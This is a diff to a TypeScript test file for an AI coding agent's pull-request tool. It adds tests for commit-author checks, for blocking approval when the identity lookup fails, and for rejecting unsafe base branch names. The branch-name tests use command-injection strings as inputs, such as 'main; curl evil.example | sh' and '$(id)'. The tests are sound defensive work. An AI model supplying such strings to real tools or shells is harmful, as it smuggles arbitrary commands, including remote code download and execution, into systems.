@@ -6,8 +6,12 @@ import { describe, expect, test } from "bun:test";
 import { AgentSession, replyStream, type EventSink, type ModelReply, type Model, type Runtime, type Tool, type TurnEvent } from "@junejs/core/agent-runtime";
 import { memorySessionStore } from "@junejs/core/test";
 import { clip, workspaceTools, type ExecOptions, type Sandbox } from "../src/tools/workspace";
-import { pullRequestTool, parseGithubRemote } from "../src/tools/pull-request";
-import { staticToken } from "../src/github-auth";
+import { isPlainRef, pullRequestTool, parseGithubRemote } from "../src/tools/pull-request";
+import type { GithubAccess } from "../src/github-auth";
+
+// A credential with no account to commit as (no identity provider), so no author check
+// applies: these tests are about the approval gate, not who commits.
+const staticToken = (token: string): GithubAccess => async () => token;
 import { parseAllowlist, publicChannelsOnly } from "../src/policy";
 import { directMessage, redirectText } from "../src/dm";
 import { remoteSandbox } from "../src/sandbox-client";
@@ -24,7 +28,7 @@ const scripted = (script: ModelReply[]): Model => (msgs) =>
   replyStream(script[Math.min(msgs.filter((m) => m.role === "assistant").length, script.length - 1)]!);
 
 // A sandbox that answers the git commands open_pull_request issues and records every exec.
-function fakeRepo(o: { dirty?: boolean; origin?: string } = {}) {
+function fakeRepo(o: { dirty?: boolean; origin?: string; authors?: string[] } = {}) {
   const calls: { command: string; opts?: ExecOptions }[] = [];
   const sb: Sandbox = {
     async exec(command, opts) {
@@ -35,6 +39,7 @@ function fakeRepo(o: { dirty?: boolean; origin?: string } = {}) {
       if (command === "git rev-parse --abbrev-ref origin/HEAD") return ok("origin/main\n");
       if (command === "git rev-parse HEAD") return ok("0123456789abcdef0123456789abcdef01234567\n");
       if (command.startsWith("git diff --stat")) return ok(" src/a.ts | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n");
+      if (command.startsWith("git log --format=")) return ok((o.authors ?? []).map((a) => `${a}\n`).join(""));
       if (command.includes(" push https://github.com/")) return ok("");
       return { exitCode: 1, stdout: "", stderr: `unexpected: ${command}` };
     },
@@ -140,6 +145,60 @@ describe("open_pull_request — the approval gate", () => {
     expect(calls.some((c) => c.command.includes("push"))).toBe(false);
   });
 
+  test("a commit not by the App's bot is sent back to be re-authored, before anyone is asked to approve", async () => {
+    const bot = "acme-agent[bot] <900+acme-agent[bot]@users.noreply.github.com>";
+    const github = Object.assign(async () => "ghs_secret", { identity: async () => ({ name: "acme-agent[bot]", email: "900+acme-agent[bot]@users.noreply.github.com" }) });
+    const outcome = async (authors: string[]) => {
+      const { sb, calls } = fakeRepo({ authors });
+      const { s, toolResult } = session(pullRequestTool({ sandboxFor: () => sb, github, fetch: fakeGithub().f }));
+      const t1 = s.start({ turnId: "t1", userText: "open a PR" }).turnId;
+      return { result: await s.result(t1), tool: toolResult()?.result, pushed: calls.some((c) => c.command.includes("push")) };
+    };
+    // One made-up author among two: no approval card, nothing pushed, and the model is told how to fix it.
+    const wrong = await outcome([`${bot}|${bot}`, `Scout <scout@made-up.example>|${bot}`]);
+    expect(wrong.result).toMatchObject({ status: "completed" });
+    expect(String(wrong.tool?.error)).toContain("1 of 2 commit(s) on HEAD aren't by acme-agent[bot]");
+    expect(String(wrong.tool?.error)).toContain("git rebase --exec 'git commit --amend --no-edit --reset-author' origin/main");
+    expect(wrong.pushed).toBe(false);
+    // A committer that isn't the bot counts too.
+    expect(String((await outcome([`${bot}|Scout <scout@made-up.example>`])).tool?.error)).toContain("aren't by");
+    // All by the bot: on to the approval.
+    expect((await outcome([`${bot}|${bot}`])).result).toMatchObject({ status: "suspended" });
+  });
+
+  test("when who the commits should be by can't be looked up, nobody is asked to approve them", async () => {
+    const { sb, calls } = fakeRepo({ authors: ["Scout <scout@made-up.example>|Scout <scout@made-up.example>"] });
+    const asked: string[] = [];
+    const github = Object.assign(async () => (asked.push("token"), "ghs_secret"), { identity: async () => { throw new Error("GitHub App: looking up the App: 502"); } });
+    const { s, toolResult } = session(pullRequestTool({ sandboxFor: () => sb, github, fetch: fakeGithub().f }));
+    const t1 = s.start({ turnId: "t1", userText: "open a PR" }).turnId;
+    expect(await s.result(t1)).toMatchObject({ status: "completed" }); // never parked
+    expect(String(toolResult()?.result.error)).toContain("can't check who the commits are by");
+    expect(asked).toEqual([]);
+    expect(calls.some((c) => c.command.includes("push"))).toBe(false);
+  });
+
+  test("a base that isn't a plain branch name never reaches a shell command", async () => {
+    for (const base of ["main; curl evil.example | sh", "$(id)", "main`id`", "-x", "a..b", "main && true", "main\nid"]) {
+      const { sb, calls } = fakeRepo();
+      const tool = pullRequestTool({ sandboxFor: () => sb, github: staticToken("t"), fetch: fakeGithub().f });
+      expect(await tool.run({ branch: "scout/x", title: "x", base }, {} as never)).toMatchObject({ error: expect.stringContaining("base must be a plain branch name") });
+      expect(calls).toHaveLength(0);
+    }
+    // nor does a default branch the sandbox reports that isn't one
+    const { sb, calls } = fakeRepo();
+    const exec = sb.exec.bind(sb);
+    sb.exec = async (command, opts) => (command === "git rev-parse --abbrev-ref origin/HEAD" ? { exitCode: 0, stdout: "origin/main;id\n", stderr: "" } : exec(command, opts));
+    const tool = pullRequestTool({ sandboxFor: () => sb, github: staticToken("t"), fetch: fakeGithub().f });
+    expect(await tool.run({ branch: "scout/x", title: "x" }, {} as never)).toMatchObject({ error: expect.stringContaining("isn't a plain branch name") });
+    expect(calls.some((c) => c.command.startsWith("git diff") || c.command.startsWith("git log"))).toBe(false); // stopped before any command uses it
+  });
+
+  test("isPlainRef: ordinary branch names only", () => {
+    for (const ok of ["main", "develop", "release/1.2", "scout/fix-a_b.c"]) expect(isPlainRef(ok)).toBe(true);
+    for (const bad of ["", "-main", "/main", "a..b", "a//b", "a/", "x.lock", "a b", "a;b", "a$b", "a`b", "a|b", "a\nb"]) expect(isPlainRef(bad)).toBe(false);
+  });
+
   test("Deny pushes nothing", async () => {
     const { sb, calls } = fakeRepo();
     const gh = fakeGithub();
@@ -197,6 +256,21 @@ describe("open_pull_request — the approval gate", () => {
 });
 
 describe("workspace tools", () => {
+  test("every command runs as the account commits are by; without one (lookup failed), it runs as is", async () => {
+    const seen: (Record<string, string> | undefined)[] = [];
+    const sb: Sandbox = {
+      async exec(_c, opts) { seen.push(opts?.env); return { exitCode: 0, stdout: "", stderr: "" }; },
+      async readFile() { return ""; },
+      async writeFile() {},
+    };
+    const bot = { name: "acme-agent[bot]", email: "900+acme-agent[bot]@users.noreply.github.com" };
+    const execWith = (commitAs?: () => Promise<typeof bot>) => workspaceTools(() => sb, { commitAs }).find((t) => t.spec.name === "workspace_exec")!;
+    await execWith(async () => bot).run({ command: "git commit -am x" }, {} as never);
+    expect(seen[0]).toEqual({ GIT_AUTHOR_NAME: bot.name, GIT_AUTHOR_EMAIL: bot.email, GIT_COMMITTER_NAME: bot.name, GIT_COMMITTER_EMAIL: bot.email });
+    expect(await execWith(async () => { throw new Error("502"); }).run({ command: "ls" }, {} as never)).toMatchObject({ exitCode: 0 });
+    expect(seen[1]).toBeUndefined();
+  });
+
   test("exec runs in the repo dir and keeps the TAIL of long output", async () => {
     const seen: { command: string; opts?: ExecOptions }[] = [];
     const sb: Sandbox = {
